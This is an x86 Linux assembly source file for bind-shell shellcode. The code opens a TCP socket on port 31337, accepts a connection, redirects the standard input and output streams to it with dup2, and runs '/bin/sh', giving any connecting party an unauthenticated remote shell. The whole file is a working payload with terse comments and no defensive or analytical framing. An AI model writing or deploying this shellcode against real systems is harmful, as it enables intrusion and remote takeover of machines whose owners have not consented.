BITS 32

;sys_socket(2, 1, 0)
xor ebx, ebx ;zero out eax,ebx,edx
mul ebx
push BYTE 0x66 ;sys_socketcall()
pop eax
inc ebx		   ;ebx=1 for socket()
push edx	   ;IPPROTO_IP
push BYTE 0x1  ;SOCK_STREAM
push BYTE 0x2  ;AF_INET
mov ecx, esp
int 0x80

;sys_bind(sockfd, [AF_INET, <port>, 0], socklen_t (16))
xchg eax, esi  ;mov sockfd into esi for later calls
push BYTE 0x66 ;for sys_socketcall
pop eax
inc ebx		   ;2 for bind()
push edx 	   ;build sock_addr struct
push WORD 0x697a ;port 31337 in host order
push WORD bx	;2 for AF_INET
mov ecx, esp	;ecx contains pointer to struct

push BYTE 16    ;build arg array for bind
push ecx
push esi
mov ecx,esp
int 0x80

;sys_listen(sockfd, int backlog)
push 0x66
pop eax
inc ebx	   
inc ebx    ;4 for sys_listen
push ebx   ;backlog = 4
push esi   ;sockfd
mov ecx, esp
int 0x80

;sys_accept(sockfd, NULL, 0)
push 0x66
pop eax
inc ebx  ;5 for accept

push edx ;addrelen = 0
push edx ;sock_addr = NULL
push esi ;sockfd
mov ecx, esp ;arg array
int 0x80 ;this call will return the connection fd in eax

;dup2(newfd, oldfd) 
xchg eax,ebx  ;mov connection fd into ebx
push BYTE 0x2
pop ecx

;loop over all file descriptors and call dup2
loop:
mov BYTE al,0x3f
int 0x80
dec ecx
jns loop

;execve("/bin//sh", NULL, NULL)
push eax		;eax is zero after last call to dup2
push 0x68732f2f ;"//sh"
push 0x6e69622f ;"/bin"
mov ebx, esp	;ebx = *"/bin/sh"
inc ecx 		;ecx was -1, now 0, note edx is also 0 at this point
mov al, 0xb		;execve
int 0x80




